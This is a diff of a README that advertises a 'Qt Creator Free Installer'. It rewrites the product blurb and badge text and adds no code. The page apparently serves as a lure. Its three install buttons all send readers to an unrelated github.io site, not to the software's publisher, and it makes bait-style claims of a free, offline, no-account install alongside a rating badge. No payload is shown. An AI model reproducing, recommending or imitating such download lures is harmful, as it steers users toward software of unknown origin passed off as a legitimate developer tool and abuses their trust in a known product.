@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-IDE-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-C++/Qt+IDE-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Qt Creator Free Installer** — Qt Creator is a free, cross-platform IDE by The Qt Company for developing Qt and C++ applications. Works without internet access, no account required. Full offline installation.
+**💻 Qt Creator Free Installer** — Qt Creator is the official cross-platform IDE for Qt framework development, supporting C++, QML, and JavaScript. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Qt Creator](https://img.shields.io/badge/⬇_Install_Qt%20Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Qt Creator](https://img.shields.io/badge/⬇_Install_Qt+Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Qt Creator
 
-Qt Creator is a free, cross-platform IDE by The Qt Company for developing Qt and C++ applications. It provides a designer for Qt Widgets and QML, CMake and qmake integration, a built-in debugger, and cross-platform deployment tools.
+Qt Creator is the official cross-platform IDE for Qt framework development, supporting C++, QML, and JavaScript. Features include a visual UI designer for QML and Qt Widgets, built-in Qt documentation, CMake and qmake support, and profiling tools. Essential for developing cross-platform applications with the Qt framework for desktop, mobile, and embedded systems.
 
 ---
 
 ## ❌ Problem: Qt Creator is hard to access
 
-- **Qt Framework Tied** — Best experience developing Qt applications; general C++ use is secondary
-- **Steep Learning Curve** — Qt framework and QML require dedicated learning
-- **Commercial Qt License** — Qt commercial license required for closed-source commercial applications
-- **Limited Python Support** — C++ and QML are primary; Python support is secondary
+- **Qt Ecosystem Tie** — Primarily useful for Qt-based projects; less suitable for non-Qt C++
+- **Learning Curve** — Qt's signal/slot model and QML require dedicated study
+- **Commercial License** — Qt commercial license required for proprietary applications
+- **Performance** — Resource usage can be significant for large Qt projects
 
 ---
 
@@ -81,7 +81,7 @@ Qt Creator is a free, cross-platform IDE by The Qt Company for developing Qt and
 
 <div align="center">
 
-[![⬇ Install Qt Creator](https://img.shields.io/badge/⬇_Install_Qt%20Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Qt Creator](https://img.shields.io/badge/⬇_Install_Qt+Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Qt Creator is a free, cross-platform IDE by The Qt Company for developing Qt and
 
 ---
 
-**Qt Creator Free Installer** — Qt Creator is a free, cross-platform IDE by The Qt Company for developing Qt and C++ applications. Install without internet connection today!
+**Qt Creator Free Installer** — Qt Creator is the official cross-platform IDE for Qt framework development, supporting C++, QML, and JavaScript. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Qt Creator](https://img.shields.io/badge/⬇_Install_Qt%20Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Qt Creator](https://img.shields.io/badge/⬇_Install_Qt+Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
